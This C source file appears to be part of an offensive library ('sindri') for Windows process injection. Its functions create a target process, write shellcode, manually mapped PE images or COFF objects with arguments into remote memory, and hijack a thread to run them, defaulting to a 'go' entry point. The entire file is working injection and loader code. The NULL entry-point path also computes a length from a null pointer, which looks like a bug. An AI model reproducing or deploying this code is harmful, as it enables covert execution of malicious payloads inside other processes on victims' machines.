#include <sindri/common/memory.h>
#include <sindri/common/string.h>
#include <sindri/injection/classic/engine.h>
#include <sindri/injection/hijack/chain.h>
#include <sindri/internal/windows/constants.h>
#include <sindri/loaders/coff/engine.h>
#include <sindri/loaders/pe/engine.h>
#include <sindri/parsers/coff/symbols.h>
#include <sindri/status/core.h>

snd_status_t snd_inj_hijack_shell(snd_inj_ctx_t *ctx, PVOID return_thunk) {
    SND_CHECK_NULL(ctx);

    SND_TRY(snd_inj_hijack_create_target(ctx));
    SND_TRY(snd_inj_classic_alloc_remote(ctx));
    SND_TRY(snd_inj_classic_write_payload(ctx));
    SND_TRY(snd_inj_classic_set_protections(ctx));
    SND_TRY(snd_inj_hijack_execute(ctx, return_thunk, 0, 0));

    return SND_OK;
}

snd_status_t snd_inj_hijack_pe(snd_ldr_pe_ctx_t *ldr_ctx, snd_inj_ctx_t *inj_ctx, PVOID return_thunk) {
    SND_CHECK_NULL(ldr_ctx, inj_ctx, ldr_ctx->raw_source);

    snd_buffer_t inject_buf = {0};

    SND_TRY(snd_pe_parse(ldr_ctx->raw_source, FALSE, &ldr_ctx->pe));
    ldr_ctx->stage = SND_STAGE_PARSED;

    if (!SND_IS_ARCH_COMPATIBLE(ldr_ctx->pe.is_64bit)) {
        return SND_ERR(SND_STATUS_ARCH_MISMATCH);
    }

    SND_TRY(snd_ldr_pe_allocate_and_copy_image(ldr_ctx));

    inject_buf.data  = ldr_ctx->target.local_base;
    inject_buf.size  = ldr_ctx->target.allocated_size;
    inj_ctx->payload = &inject_buf;

    SND_TRY(snd_inj_hijack_create_target(inj_ctx));
    SND_TRY(snd_inj_classic_alloc_remote(inj_ctx));

    ldr_ctx->target.execution_base = (PVOID)inj_ctx->remote_base;

    SND_TRY(snd_ldr_pe_apply_relocations(ldr_ctx));
    SND_TRY(snd_ldr_pe_resolve_imports(ldr_ctx));
    SND_TRY(snd_inj_classic_write_payload(inj_ctx));
    SND_TRY(snd_inj_classic_set_protections(inj_ctx));

    DWORD ep_rva                = SND_PE_GET_NT_FIELD(&ldr_ctx->pe, OptionalHeader.AddressOfEntryPoint);
    inj_ctx->remote_entry_point = SND_PTR_ADD(inj_ctx->remote_base, ep_rva);

    SND_TRY(snd_inj_hijack_execute(inj_ctx, return_thunk, 0, 0));

    return SND_OK;
}

snd_status_t snd_inj_hijack_coff(snd_ldr_coff_ctx_t *ldr_ctx, snd_inj_ctx_t *inj_ctx, PVOID return_thunk,
                                 const char *entry_point, void *args, int arg_len) {
    SND_CHECK_NULL(ldr_ctx, inj_ctx, ldr_ctx->raw_source);

    char        ep_name[SND_COFF_MAX_SYMBOL_LEN] = {0};
    const char *s                                = entry_point ? entry_point : "go";

    size_t s_len = snd_strnlen(entry_point, SND_COFF_MAX_SYMBOL_LEN);
    snd_strncpy(ep_name, SND_COFF_MAX_SYMBOL_LEN, s, s_len);
    snd_buffer_t inject_buf = {0};

    SND_TRY(snd_inj_hijack_create_target(inj_ctx));

    ldr_ctx->stage = SND_COFF_STAGE_UNINITIALIZED;
    SND_TRY(snd_coff_parse(ldr_ctx->raw_source, &ldr_ctx->coff));
    ldr_ctx->stage = SND_COFF_STAGE_PARSED;

    SND_TRY(snd_ldr_coff_allocate_and_copy_sections(ldr_ctx));

    SIZE_T total_injection_size = ldr_ctx->target.allocated_size + arg_len;

    inject_buf.data  = ldr_ctx->target.local_base;
    inject_buf.size  = ldr_ctx->target.allocated_size;
    inj_ctx->payload = &inject_buf;

    inj_ctx->remote_size = total_injection_size;
    SND_TRY(inj_ctx->proc_api->alloc_remote(inj_ctx->target_process, inj_ctx->remote_size,
                                            SND_MEM_COMMIT | SND_MEM_RESERVE, SND_PAGE_READWRITE,
                                            &inj_ctx->remote_base));
    inj_ctx->stage = SND_INJ_STAGE_MEMORY_ALLOCATED;

    ldr_ctx->target.execution_base = (PVOID)inj_ctx->remote_base;

    SND_TRY(snd_ldr_coff_resolve_symbols(ldr_ctx));
    SND_TRY(snd_ldr_coff_apply_relocations(ldr_ctx));
    SND_TRY(snd_inj_classic_write_payload(inj_ctx));

    ULONG_PTR arg2 = 0;
    if (args != NULL && arg_len > 0) {
        SIZE_T written         = 0;
        PVOID  remote_args_ptr = (PVOID)((ULONG_PTR)inj_ctx->remote_base + ldr_ctx->target.allocated_size);
        SND_TRY(inj_ctx->proc_api->write_remote(inj_ctx->target_process, remote_args_ptr, args, arg_len, &written));

        inj_ctx->remote_arg = remote_args_ptr;
        arg2                = (ULONG_PTR)arg_len;
    } else {
        inj_ctx->remote_arg = NULL;
    }

    SND_TRY(snd_inj_classic_set_protections(inj_ctx));

    PSND_IMAGE_SYMBOL entry_sym = NULL;
    SND_TRY(snd_coff_find_symbol_by_name(&ldr_ctx->coff, ep_name, s_len, &entry_sym, NULL));

    LPVOID    section_base_local = ldr_ctx->target.section_map[entry_sym->SectionNumber];
    ULONG_PTR ep_rva = SND_PTR_DELTA(SND_PTR_ADD(section_base_local, entry_sym->Value), ldr_ctx->target.local_base);
    inj_ctx->remote_entry_point = SND_PTR_ADD(inj_ctx->remote_base, ep_rva);

    SND_TRY(snd_inj_hijack_execute(inj_ctx, return_thunk, (ULONG_PTR)inj_ctx->remote_arg, arg2));

    return SND_OK;
}